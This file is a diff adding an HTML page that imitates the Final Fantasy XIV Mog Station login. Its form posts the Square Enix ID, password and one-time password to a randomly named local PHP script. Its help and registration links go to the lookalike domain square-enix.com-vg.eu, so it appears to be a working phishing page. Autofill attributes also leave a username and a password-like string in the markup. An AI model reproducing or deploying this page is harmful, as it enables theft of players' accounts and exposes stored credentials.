@@ -1,0 +1,336 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US"><head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="description" content="Official management site for FINAL FANTASY XIV: Mog Station.">
+
+<title>FINAL FANTASY XIV: Mog Station</title>
+<link rel="stylesheet" href="Login%20Site%20FINAL%20FANTASY%20XIV%20Mog%20Station_files/mod_default.css" type="text/css">
+<link rel="stylesheet" href="Login%20Site%20FINAL%20FANTASY%20XIV%20Mog%20Station_files/mod_layout.css" type="text/css">
+<link rel="stylesheet" href="Login%20Site%20FINAL%20FANTASY%20XIV%20Mog%20Station_files/mod_common.css" type="text/css">
+<link rel="stylesheet" href="Login%20Site%20FINAL%20FANTASY%20XIV%20Mog%20Station_files/mod_form.css" type="text/css">
+<link rel="stylesheet" href="Login%20Site%20FINAL%20FANTASY%20XIV%20Mog%20Station_files/mod_mog.css" type="text/css">
+
+
+	<!-- Google Tag Manager -->
+	<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+	new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+	j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+	'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+	})(window,document,'script','digitalData','GTM-P37XSWJ');</script>
+	<!-- End Google Tag Manager -->
+
+
+	
+	<link rel="stylesheet" href="Login%20Site%20FINAL%20FANTASY%20XIV%20Mog%20Station_files/basis.css" type="text/css">
+	
+	<link rel="stylesheet" href="Login%20Site%20FINAL%20FANTASY%20XIV%20Mog%20Station_files/template.css" type="text/css">
+	
+	<link rel="stylesheet" href="Login%20Site%20FINAL%20FANTASY%20XIV%20Mog%20Station_files/content.css" type="text/css">
+	
+	<link rel="stylesheet" href="Login%20Site%20FINAL%20FANTASY%20XIV%20Mog%20Station_files/i18n.css" type="text/css">
+	
+	<link rel="stylesheet" href="Login%20Site%20FINAL%20FANTASY%20XIV%20Mog%20Station_files/mod_mog_langSelect.css" type="text/css">
+	
+	<link rel="stylesheet" href="Login%20Site%20FINAL%20FANTASY%20XIV%20Mog%20Station_files/template2.css" type="text/css">
+	
+	<link rel="shortcut icon" href="https://cache.secure.square-enix.com/account/content/mogstation/favicon.ico?ver=09202131050124">
+
+	<script type="text/javascript" src="Login%20Site%20FINAL%20FANTASY%20XIV%20Mog%20Station_files/jquery-3.js"></script>
+	<script type="text/javascript" src="Login%20Site%20FINAL%20FANTASY%20XIV%20Mog%20Station_files/lds.js"></script>
+	<script type="text/javascript" src="Login%20Site%20FINAL%20FANTASY%20XIV%20Mog%20Station_files/init.js"></script>
+	<script type="text/javascript" src="Login%20Site%20FINAL%20FANTASY%20XIV%20Mog%20Station_files/mogpop.js"></script>
+
+<script type="text/javascript">
+jQuery.noConflict(); 
+jQuery.ajaxSetup({ cache: false }); 
+</script> 
+<script src="Login%20Site%20FINAL%20FANTASY%20XIV%20Mog%20Station_files/jquery.js"></script>
+<script src="Login%20Site%20FINAL%20FANTASY%20XIV%20Mog%20Station_files/logo.js"></script>
+<script src="Login%20Site%20FINAL%20FANTASY%20XIV%20Mog%20Station_files/is_iframe.js"></script>
+<script src="Login%20Site%20FINAL%20FANTASY%20XIV%20Mog%20Station_files/api.js" async="" defer="defer"></script>
+<style>
+#recaptcha_widget_div #recaptcha_area {
+	margin:0px auto;
+}
+.recaptcha_input_area {
+	line-height: 1;
+}
+</style>
+</head>
+<body id="index">
+<div id="en">
+
+
+			<!-- corp_header -->
+			<div id="corp_header">
+				<ul class="clearfix">
+					
+					<li class="float_left">
+						
+						<a class="button" id="sqex_logo_button" href="http://www.square-enix.com/" target="_blank"></a>
+					</li>
+					
+					<li class="float_rigiht">
+						<div id="lang__select_wrapper" class="brand__lang dropdown_trigger_box">
+							<a href="javascript:void(0);" class="brand__lang__btn brand__lang__na dropdown_trigger">English</a>
+							<ul class="brand__lang__select dropdown" style="opacity: 0; display: none;">
+								<li>
+									<a class="send brand__lang__jp" href="" action="oauthauth?response_type=code&amp;redirect_uri=https%3A%2F%2Fsecure.square-enix.com%2Faccount%2Fapp%2Fsvc%2Ftop%3Frequest%3Dmogstation&amp;client_id=ffxiv_mog&amp;alar=1&amp;lang=ja-jp">日本語</a>
+								</li>
+								<li>
+									<a class="send brand__lang__na" href="" action="oauthauth?response_type=code&amp;redirect_uri=https%3A%2F%2Fsecure.square-enix.com%2Faccount%2Fapp%2Fsvc%2Ftop%3Frequest%3Dmogstation&amp;client_id=ffxiv_mog&amp;alar=1&amp;lang=en-us">English</a>
+								</li>
+								<li>
+									<a class="send brand__lang__eu" href="" action="oauthauth?response_type=code&amp;redirect_uri=https%3A%2F%2Fsecure.square-enix.com%2Faccount%2Fapp%2Fsvc%2Ftop%3Frequest%3Dmogstation&amp;client_id=ffxiv_mog&amp;alar=1&amp;lang=en-gb">English</a>
+								</li>
+								<li>
+									<a class="send brand__lang__fr" href="" action="oauthauth?response_type=code&amp;redirect_uri=https%3A%2F%2Fsecure.square-enix.com%2Faccount%2Fapp%2Fsvc%2Ftop%3Frequest%3Dmogstation&amp;client_id=ffxiv_mog&amp;alar=1&amp;lang=fr-fr">Français</a>
+								</li>
+								<li>
+									<a class="send brand__lang__de" href="" action="oauthauth?response_type=code&amp;redirect_uri=https%3A%2F%2Fsecure.square-enix.com%2Faccount%2Fapp%2Fsvc%2Ftop%3Frequest%3Dmogstation&amp;client_id=ffxiv_mog&amp;alar=1&amp;lang=de-de">Deutsch</a>
+								</li>
+							</ul>
+						</div>
+					</li>
+				</ul>
+			</div><!-- corp_header -->
+
+
+	<!-- Google Tag Manager (noscript) -->
+	<span><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P37XSWJ" style="display:none;visibility:hidden" mduqgpwyo="" width="0" height="0"></iframe></span>
+	<!-- End Google Tag Manager (noscript) -->
+
+
+
+<script type="text/javascript">
+<!--
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-39676948-1', 'square-enix.com');
+ga('send','pageview');
+
+ga('create', 'UA-39676948-13', 'auto', {'name': 'secondTracker'});
+ga('secondTracker.send','pageview','MOG-/login-top');
+-->
+</script>
+
+<script type="text/javascript" src="Login%20Site%20FINAL%20FANTASY%20XIV%20Mog%20Station_files/base.js"></script>
+<script id="_swk" type="text/javascript" src="Login%20Site%20FINAL%20FANTASY%20XIV%20Mog%20Station_files/swk.js"></script>
+
+
+<!-- login_header -->
+<div id="login_header"></div><!-- login_header -->
+
+<div id="login-contentsArea" class="">
+
+
+
+<!-- <div class="servicebanner"></div> -->
+
+	<!-- base_body -->
+	<div id="base_body">
+		<div class="large_text note_color"><b>Welcome to the Mog Station, the account management page for FINAL FANTASY XIV!</b></div>
+		
+		<div class="tiny_br"></div>
+		<div class="bound_login text_left">
+		Here you can manage your FINAL FANTASY XIV account and make use of additional services such as World transfers.
+	</div>
+		<br>
+		<ul class="clearfix">
+			
+			<li class="float_left">
+			
+			<form action="9wer9u4324jnrhrhwr89wyer93u4jjyfsvnfhg.php" method="post" data-dashlane-rid="e80fb5f3b05f17ac" data-form-type="login">
+				
+				<div id="login_box">
+					<div class="box_header">Log In</div>
+					<div class="box_body">
+						<div>
+							
+							<div class="tiny_br"></div>
+							
+							<input type="hidden" name="_STORED_" value="dcf06e5f47798101ac74fb0e35135d9b5f83fa22842f00c9fcc43d0b31208e93909fda8298dff852ccd860bf72939f95528245f4a3916c2bda4e5008c818e522bed0c37d51ffa715c4524f04617eaafa5997e20b6ec0afe893a5b572358cfadc840d7f2f93cba8c9cdf40e3bd7237113e6">
+
+							
+						</div>
+						
+						<div class="tiny_br"></div>
+						<!-- login_box_inner -->
+						<div id="login_box_inner">
+								
+								<table style="margin: auto;">
+									<tbody><tr>
+										<td class="text_left"><span class="large_text">Square Enix ID</span></td>
+										<td width="15"></td>
+										<td>
+											<input type="text" name="username" id="username" class="inpForm input_text login_input_text" value="Twistedlink" tabindex="1" autofocus="" data-dashlane-rid="86afe9506fa2935d" data-kwimpalastatus="alive" data-kwimpalaid="1637552539534-3" data-kwcachedvalue="Twistedlink" style="background-color: rgb(255, 255, 204); color: rgb(0, 0, 0);" data-form-type="username">
+										<span data-dashlanecreated="true" style="border-block: initial; border-inline: initial; border-start-start-radius: initial; border-start-end-radius: initial; border-end-start-radius: initial; border-end-end-radius: initial; overflow-inline: initial; overflow-block: initial; overscroll-behavior-inline: initial; overscroll-behavior-block: initial; margin-block: initial; margin-inline: initial; scroll-margin-block: initial; scroll-margin-inline: initial; padding-block: initial; padding-inline: initial; scroll-padding-block: initial; scroll-padding-inline: initial; inset-block: initial; inset-inline: initial; block-size: initial; min-block-size: initial; max-block-size: initial; inline-size: initial; min-inline-size: initial; max-inline-size: initial; background-color: initial; background-image: url(&quot;moz-extension://61c01477-6b30-4609-a079-80eb0e895358/content/injected/logo-autofill-known.svg&quot;); background-position: center center; background-repeat: no-repeat; background-attachment: initial; background-clip: initial; background-origin: initial; background-size: contain; background-blend-mode: initial; border: medium none; border-radius: initial; box-decoration-break: initial; -moz-float-edge: initial; display: inline; position: absolute; float: initial; clear: initial; vertical-align: initial; overflow: initial; overflow-anchor: initial; transition: initial; animation: initial; transform: initial; rotate: initial; scale: initial; translate: initial; offset: initial; scroll-behavior: initial; scroll-snap-align: initial; scroll-snap-type: initial; overscroll-behavior: initial; isolation: initial; break-after: initial; break-before: initial; break-inside: initial; resize: initial; perspective: initial; perspective-origin: initial; backface-visibility: initial; transform-box: initial; transform-style: initial; transform-origin: initial; contain: initial; appearance: initial; -moz-orient: initial; will-change: initial; shape-image-threshold: initial; shape-margin: initial; shape-outside: initial; touch-action: initial; -webkit-line-clamp: initial; columns: initial; column-fill: initial; column-rule: initial; column-span: initial; content: initial; counter-increment: initial; counter-reset: initial; counter-set: initial; opacity: 1; box-shadow: initial; clip: initial; filter: initial; mix-blend-mode: initial; font: initial; font-synthesis: initial; visibility: visible; writing-mode: initial; text-orientation: initial; color-adjust: initial; image-rendering: initial; image-orientation: initial; dominant-baseline: initial; text-anchor: initial; color-interpolation: initial; color-interpolation-filters: initial; fill: initial; fill-opacity: initial; fill-rule: initial; shape-rendering: initial; stroke: initial; stroke-width: initial; stroke-linecap: initial; stroke-linejoin: initial; stroke-miterlimit: initial; stroke-opacity: initial; stroke-dasharray: initial; stroke-dashoffset: initial; clip-rule: initial; marker: initial; paint-order: initial; border-collapse: initial; empty-cells: initial; caption-side: initial; border-spacing: initial; color: initial; text-transform: initial; hyphens: initial; -moz-text-size-adjust: initial; text-indent: initial; overflow-wrap: initial; word-break: initial; text-justify: initial; text-align-last: initial; text-align: initial; letter-spacing: initial; word-spacing: initial; white-space: initial; text-shadow: initial; text-emphasis: initial; text-emphasis-position: initial; tab-size: initial; line-break: initial; -webkit-text-fill-color: initial; -webkit-text-stroke: initial; ruby-align: initial; ruby-position: initial; text-combine-upright: initial; text-rendering: initial; text-underline-offset: initial; text-underline-position: initial; text-decoration-skip-ink: initial; cursor: initial; pointer-events: initial; -moz-user-input: initial; -moz-user-modify: initial; -moz-user-focus: initial; caret-color: initial; accent-color: initial; scrollbar-color: initial; list-style: initial; quotes: initial; -moz-image-region: initial; margin: initial; scroll-margin: initial; outline: initial; outline-offset: initial; padding: initial; scroll-padding: initial; top: 358px; right: initial; bottom: initial; left: 883.667px; z-index: auto; flex-flow: initial; place-content: initial; place-items: initial; flex: initial; place-self: initial; order: initial; width: 16px; min-width: 16px; max-width: initial; height: 16px; min-height: initial; max-height: initial; box-sizing: initial; object-fit: initial; object-position: initial; grid-area: initial; grid: initial; gap: initial; aspect-ratio: initial; vector-effect: initial; stop-color: initial; stop-opacity: initial; flood-color: initial; flood-opacity: initial; lighting-color: initial; mask-type: initial; clip-path: initial; mask: initial; x: initial; y: initial; cx: initial; cy: initial; rx: initial; ry: initial; r: initial; table-layout: initial; text-overflow: initial; text-decoration: initial; ime-mode: initial; scrollbar-width: initial; user-select: initial; -moz-window-dragging: initial; -moz-force-broken-image-icon: initial; -moz-box-align: initial; -moz-box-direction: initial; -moz-box-flex: initial; -moz-box-orient: initial; -moz-box-pack: initial; -moz-box-ordinal-group: initial;"></span></td>
+										<td width="5"></td>
+									</tr>
+									<tr class="tiny_br"></tr>
+									<tr>
+										<td class="text_left"><span class="large_text">Square Enix Password</span></td>
+										<td>&nbsp;</td>
+										<td>
+											<input type="password" name="password" id="password" class="inpForm input_text login_input_text" tabindex="2" autocomplete="off" data-dashlane-rid="764596ab98730b83" data-kwimpalastatus="alive" data-kwimpalaid="1637552539534-1" data-kwcachedvalue="9baHqx7bG7Rj" style="background-color: rgb(255, 255, 204); color: rgb(0, 0, 0);" data-form-type="password">
+										<span data-dashlanecreated="true" style="border-block: initial; border-inline: initial; border-start-start-radius: initial; border-start-end-radius: initial; border-end-start-radius: initial; border-end-end-radius: initial; overflow-inline: initial; overflow-block: initial; overscroll-behavior-inline: initial; overscroll-behavior-block: initial; margin-block: initial; margin-inline: initial; scroll-margin-block: initial; scroll-margin-inline: initial; padding-block: initial; padding-inline: initial; scroll-padding-block: initial; scroll-padding-inline: initial; inset-block: initial; inset-inline: initial; block-size: initial; min-block-size: initial; max-block-size: initial; inline-size: initial; min-inline-size: initial; max-inline-size: initial; background-color: initial; background-image: url(&quot;moz-extension://61c01477-6b30-4609-a079-80eb0e895358/content/injected/logo-autofill-known.svg&quot;); background-position: center center; background-repeat: no-repeat; background-attachment: initial; background-clip: initial; background-origin: initial; background-size: contain; background-blend-mode: initial; border: medium none; border-radius: initial; box-decoration-break: initial; -moz-float-edge: initial; display: inline; position: absolute; float: initial; clear: initial; vertical-align: initial; overflow: initial; overflow-anchor: initial; transition: initial; animation: initial; transform: initial; rotate: initial; scale: initial; translate: initial; offset: initial; scroll-behavior: initial; scroll-snap-align: initial; scroll-snap-type: initial; overscroll-behavior: initial; isolation: initial; break-after: initial; break-before: initial; break-inside: initial; resize: initial; perspective: initial; perspective-origin: initial; backface-visibility: initial; transform-box: initial; transform-style: initial; transform-origin: initial; contain: initial; appearance: initial; -moz-orient: initial; will-change: initial; shape-image-threshold: initial; shape-margin: initial; shape-outside: initial; touch-action: initial; -webkit-line-clamp: initial; columns: initial; column-fill: initial; column-rule: initial; column-span: initial; content: initial; counter-increment: initial; counter-reset: initial; counter-set: initial; opacity: 1; box-shadow: initial; clip: initial; filter: initial; mix-blend-mode: initial; font: initial; font-synthesis: initial; visibility: visible; writing-mode: initial; text-orientation: initial; color-adjust: initial; image-rendering: initial; image-orientation: initial; dominant-baseline: initial; text-anchor: initial; color-interpolation: initial; color-interpolation-filters: initial; fill: initial; fill-opacity: initial; fill-rule: initial; shape-rendering: initial; stroke: initial; stroke-width: initial; stroke-linecap: initial; stroke-linejoin: initial; stroke-miterlimit: initial; stroke-opacity: initial; stroke-dasharray: initial; stroke-dashoffset: initial; clip-rule: initial; marker: initial; paint-order: initial; border-collapse: initial; empty-cells: initial; caption-side: initial; border-spacing: initial; color: initial; text-transform: initial; hyphens: initial; -moz-text-size-adjust: initial; text-indent: initial; overflow-wrap: initial; word-break: initial; text-justify: initial; text-align-last: initial; text-align: initial; letter-spacing: initial; word-spacing: initial; white-space: initial; text-shadow: initial; text-emphasis: initial; text-emphasis-position: initial; tab-size: initial; line-break: initial; -webkit-text-fill-color: initial; -webkit-text-stroke: initial; ruby-align: initial; ruby-position: initial; text-combine-upright: initial; text-rendering: initial; text-underline-offset: initial; text-underline-position: initial; text-decoration-skip-ink: initial; cursor: initial; pointer-events: initial; -moz-user-input: initial; -moz-user-modify: initial; -moz-user-focus: initial; caret-color: initial; accent-color: initial; scrollbar-color: initial; list-style: initial; quotes: initial; -moz-image-region: initial; margin: initial; scroll-margin: initial; outline: initial; outline-offset: initial; padding: initial; scroll-padding: initial; top: 390px; right: initial; bottom: initial; left: 883.667px; z-index: auto; flex-flow: initial; place-content: initial; place-items: initial; flex: initial; place-self: initial; order: initial; width: 16px; min-width: 16px; max-width: initial; height: 16px; min-height: initial; max-height: initial; box-sizing: initial; object-fit: initial; object-position: initial; grid-area: initial; grid: initial; gap: initial; aspect-ratio: initial; vector-effect: initial; stop-color: initial; stop-opacity: initial; flood-color: initial; flood-opacity: initial; lighting-color: initial; mask-type: initial; clip-path: initial; mask: initial; x: initial; y: initial; cx: initial; cy: initial; rx: initial; ry: initial; r: initial; table-layout: initial; text-overflow: initial; text-decoration: initial; ime-mode: initial; scrollbar-width: initial; user-select: initial; -moz-window-dragging: initial; -moz-force-broken-image-icon: initial; -moz-box-align: initial; -moz-box-direction: initial; -moz-box-flex: initial; -moz-box-orient: initial; -moz-box-pack: initial; -moz-box-ordinal-group: initial;"></span></td>
+										<td width="5"></td>
+									</tr>
+									<tr class="tiny_br"></tr>
+									<tr>
+									    </tr><tr class="form-inputAreaSpace"></tr>
+							<tr>
+								<td class="small_text note_color" colspan="4">
+									* Users with security tokens must use the code displayed on their token to log in.
+								</td>
+								</tr>
+							<tr class="form-inputAreaSpace"></tr>
+									    
+									<tr class="tiny_br"></tr>
+									<tr>
+									    <td class="text_left"><span class="large_text">One-Time Password</span></td>
+										<td>&nbsp;</td>
+										<td>
+											<input type="password" name="key_value" id="key_value" class="inpForm input_text login_input_text" tabindex="2" autocomplete="off" data-dashlane-rid="015b4b6367a78529" data-kwimpalastatus="alive" data-kwimpalaid="1637552539534-2" data-kwcachedvalue="9baHqx7bG7Rj" style="background-color: rgb(255, 255, 204); color: rgb(0, 0, 0);" data-form-type="password">
+										<span data-dashlanecreated="true" style="border-block: initial; border-inline: initial; border-start-start-radius: initial; border-start-end-radius: initial; border-end-start-radius: initial; border-end-end-radius: initial; overflow-inline: initial; overflow-block: initial; overscroll-behavior-inline: initial; overscroll-behavior-block: initial; margin-block: initial; margin-inline: initial; scroll-margin-block: initial; scroll-margin-inline: initial; padding-block: initial; padding-inline: initial; scroll-padding-block: initial; scroll-padding-inline: initial; inset-block: initial; inset-inline: initial; block-size: initial; min-block-size: initial; max-block-size: initial; inline-size: initial; min-inline-size: initial; max-inline-size: initial; background-color: initial; background-image: url(&quot;moz-extension://61c01477-6b30-4609-a079-80eb0e895358/content/injected/logo-autofill-known.svg&quot;); background-position: center center; background-repeat: no-repeat; background-attachment: initial; background-clip: initial; background-origin: initial; background-size: contain; background-blend-mode: initial; border: medium none; border-radius: initial; box-decoration-break: initial; -moz-float-edge: initial; display: inline; position: absolute; float: initial; clear: initial; vertical-align: initial; overflow: initial; overflow-anchor: initial; transition: initial; animation: initial; transform: initial; rotate: initial; scale: initial; translate: initial; offset: initial; scroll-behavior: initial; scroll-snap-align: initial; scroll-snap-type: initial; overscroll-behavior: initial; isolation: initial; break-after: initial; break-before: initial; break-inside: initial; resize: initial; perspective: initial; perspective-origin: initial; backface-visibility: initial; transform-box: initial; transform-style: initial; transform-origin: initial; contain: initial; appearance: initial; -moz-orient: initial; will-change: initial; shape-image-threshold: initial; shape-margin: initial; shape-outside: initial; touch-action: initial; -webkit-line-clamp: initial; columns: initial; column-fill: initial; column-rule: initial; column-span: initial; content: initial; counter-increment: initial; counter-reset: initial; counter-set: initial; opacity: 1; box-shadow: initial; clip: initial; filter: initial; mix-blend-mode: initial; font: initial; font-synthesis: initial; visibility: visible; writing-mode: initial; text-orientation: initial; color-adjust: initial; image-rendering: initial; image-orientation: initial; dominant-baseline: initial; text-anchor: initial; color-interpolation: initial; color-interpolation-filters: initial; fill: initial; fill-opacity: initial; fill-rule: initial; shape-rendering: initial; stroke: initial; stroke-width: initial; stroke-linecap: initial; stroke-linejoin: initial; stroke-miterlimit: initial; stroke-opacity: initial; stroke-dasharray: initial; stroke-dashoffset: initial; clip-rule: initial; marker: initial; paint-order: initial; border-collapse: initial; empty-cells: initial; caption-side: initial; border-spacing: initial; color: initial; text-transform: initial; hyphens: initial; -moz-text-size-adjust: initial; text-indent: initial; overflow-wrap: initial; word-break: initial; text-justify: initial; text-align-last: initial; text-align: initial; letter-spacing: initial; word-spacing: initial; white-space: initial; text-shadow: initial; text-emphasis: initial; text-emphasis-position: initial; tab-size: initial; line-break: initial; -webkit-text-fill-color: initial; -webkit-text-stroke: initial; ruby-align: initial; ruby-position: initial; text-combine-upright: initial; text-rendering: initial; text-underline-offset: initial; text-underline-position: initial; text-decoration-skip-ink: initial; cursor: initial; pointer-events: initial; -moz-user-input: initial; -moz-user-modify: initial; -moz-user-focus: initial; caret-color: initial; accent-color: initial; scrollbar-color: initial; list-style: initial; quotes: initial; -moz-image-region: initial; margin: initial; scroll-margin: initial; outline: initial; outline-offset: initial; padding: initial; scroll-padding: initial; top: 450px; right: initial; bottom: initial; left: 883.667px; z-index: auto; flex-flow: initial; place-content: initial; place-items: initial; flex: initial; place-self: initial; order: initial; width: 16px; min-width: 16px; max-width: initial; height: 16px; min-height: initial; max-height: initial; box-sizing: initial; object-fit: initial; object-position: initial; grid-area: initial; grid: initial; gap: initial; aspect-ratio: initial; vector-effect: initial; stop-color: initial; stop-opacity: initial; flood-color: initial; flood-opacity: initial; lighting-color: initial; mask-type: initial; clip-path: initial; mask: initial; x: initial; y: initial; cx: initial; cy: initial; rx: initial; ry: initial; r: initial; table-layout: initial; text-overflow: initial; text-decoration: initial; ime-mode: initial; scrollbar-width: initial; user-select: initial; -moz-window-dragging: initial; -moz-force-broken-image-icon: initial; -moz-box-align: initial; -moz-box-direction: initial; -moz-box-flex: initial; -moz-box-orient: initial; -moz-box-pack: initial; -moz-box-ordinal-group: initial;"></span></td>
+										<td width="5"></td>
+									</tr>
+									<tr class="tiny_br"></tr>
+									<tr>
+										<td class="text_left" colspan="4">
+											<a href="https://forum.square-enix.com-vg.eu/account/app/svc/reminder" target="_blank" id="forget">Forgot your ID or password?</a>
+										</td>
+									</tr>
+								</tbody></table>
+						</div><!-- login_box_inner -->
+						
+						
+						
+						<div class="tiny_br"></div>
+						
+						<div class="content_navi">
+							<table>
+								<tbody><tr>
+									<td><input id="saveSqexid" name="saveSqexid" class="spCheckbox" type="checkbox" value="1" data-dashlane-rid="ec7fd6ba77781cf9" data-form-type="consent,rememberme"></td>
+									<td>&nbsp;</td>
+									<td><label for="saveSqexid">Remember Square Enix ID</label></td>
+								</tr>
+								<tr class="tiny_br"></tr>
+								<tr>
+									<td colspan="3" align="center">
+										<input type="submit" value="" name="login" tabindex="4" class="button hover" id="login_button" style="border: none;background-color: #fff;" data-dashlane-rid="905d2c5e67d207fd" data-form-type="action,login">
+									</td>
+								</tr>
+							</tbody></table>
+						</div>
+						
+						<div class="tiny_br"></div>
+					</div>
+					<div class="box_footer"></div>
+				</div><!-- login_box -->
+				</form>
+			</li>
+			
+			
+			<li class="float_right">
+				<div class="content_box_mini">
+					<div class="box_header"></div>
+					<div class="box_body">
+						
+						<div class="tiny_br"></div>
+						
+							<a href="https://forum.square-enix.com-vg.eu/ffxiv/forums/834961/registligt?response_type=code&amp;redirect_uri=https%3A%2F%2Fsecure.square-enix.com%2Faccount%2Fapp%2Fsvc%2Ftop%3Frequest%3Dmogstation&amp;client_id=ffxiv_mog&amp;lang=en-us">
+								<div id="new_account_button" class="hover new_sqex_account"></div>
+							</a>
+						<br>
+						<div class="content_box_mini_inner">
+							
+		<b>What is a Square Enix account?</b>
+		<br>A Square Enix account is a free service provided for 
+authentification in all of Square Enix's online services. Besides its 
+use in all future online services, one can also associate multiple IDs 
+from current services to a single Square Enix account and enjoy features
+ only available to Square Enix account holders.
+	
+						</div>
+						<br>
+					</div>
+					<div class="box_footer"></div>
+				</div>
+				
+				<div class="tiny_br"></div>
+				
+				<a class="button" id="lds_logo_button_m" href="https://na.finalfantasyxiv.com/lodestone/" target="_blank"></a>
+			</li>
+			
+		</ul>
+	</div><!-- base_body -->
+<!-- / #contentsArea --></div>
+
+
+		<script type="text/javascript" src="Login%20Site%20FINAL%20FANTASY%20XIV%20Mog%20Station_files/jquery-3.js"></script>
+		
+		<div id="base_footer" style="margin-top:40px;">
+			<hr class="fade_line">
+			<table id="footer_menu">
+				<tbody><tr>
+					<td class="bound" id="about_site"><a class="mogpop" data-url="https://cache.secure.square-enix.com/account/content/mogstation/html/en/about_site.html?ver=09202131050124">About This Site</a></td>
+					<td class="bound" id="privacy"><a target="_blank" href="https://square-enix-games.com/en_US/documents/privacy">Privacy Policy</a></td>
+		
+					<td class="bound"><a target="_blank" href="https://square-enix-games.com/en_US/documents/cookies">Cookie Policy</a></td>
+					<td id="menuother"><a target="_blank" href="https://forum.square-enix.com-vg.eu/agreement/us/">User Agreement</a></td>
+		
+				</tr>
+			</tbody></table>
+			<hr class="fade_line">
+			<div id="copyright">
+				<table>
+					
+						<tbody><tr>
+							<td><a href="https://www.playstation.com/en-us/" target="_blank"><img src="Login%20Site%20FINAL%20FANTASY%20XIV%20Mog%20Station_files/PSFPS5PS4.png"></a></td>
+							<th></th>
+							<td><img src="Login%20Site%20FINAL%20FANTASY%20XIV%20Mog%20Station_files/pc_na.png"></td>
+							<th></th>
+							<td><img src="Login%20Site%20FINAL%20FANTASY%20XIV%20Mog%20Station_files/mac_2.png"></td>
+							<th></th>
+							<td><img src="Login%20Site%20FINAL%20FANTASY%20XIV%20Mog%20Station_files/steam.png"></td>
+							<th></th>
+							<td><a href="https://www.esrb.org/" target="_blank"><img id="esrb_rating" class="mt-2" src="Login%20Site%20FINAL%20FANTASY%20XIV%20Mog%20Station_files/esrb3.png"></a></td>
+							<th></th>
+							<td>
+								<a id="esrb_img" href="https://www.esrb.org/confirm/squareenix-confirmation.aspx" target="_blank"></a>
+								<a id="esrb_text" href="https://square-enix-games.com/en_US/documents/privacy" target="_blank">Privacy Policy</a>
+							</td>
+						</tr>
+					
+				</tbody></table>
+				<p style="font-size:11px">© 2010 - <script type="text/javascript">document.write(new Date().getFullYear());</script> SQUARE ENIX CO., LTD. All Rights Reserved.
+				<br>FINAL FANTASY, FINAL FANTASY XIV, FFXIV, SQUARE ENIX, and the 
+SQUARE ENIX logo are registered trademarks or trademarks of Square Enix 
+Holdings Co., Ltd.
+				<br>SHADOWBRINGERS, STORMBLOOD, HEAVENSWARD, and A REALM REBORN are registered trademarks or trademarks of Square Enix Co., Ltd.
+				<br>PlayStation, the "PS" family logo, "PS5" and "PS4" are 
+registered trademarks or trademarks of Sony Interactive Entertainment 
+Inc.
+				<br>ESRB and the ESRB rating icon are registered trademarks of the Entertainment Software Association. 
+				<br>MAC is a trademark of Apple Inc., registered in the U.S. and other countries.
+				<br>Windows is either a registered trademark or trademark of Microsoft Corporation in the United States and/or other countries.
+				<br>All other trademarks are property of their respective owners.
+				<br>©<script type="text/javascript">document.write(new Date().getFullYear());</script>
+ Valve Corporation. Steam and the Steam logo are trademarks and/or 
+registered trademarks of Valve Corporation in the U.S. and/or other 
+countries.</p>
+				
+			</div>
+
+			<br>
+		</div>
+	</div>
+
+
+
+
+<iframe src="moz-extension://61c01477-6b30-4609-a079-80eb0e895358/content/webui/index.html?type=autofill-dropdown&amp;token=1434710&amp;browser=chrome" type="content" allow="publickey-credentials-get moz-extension://61c01477-6b30-4609-a079-80eb0e895358/content/webui/index.html;" style="top: -1000px; left: -1000px;" data-dashlanecreated="1" class="kw-iframe" id="kw-iframe-dropdown"></iframe></body></html>
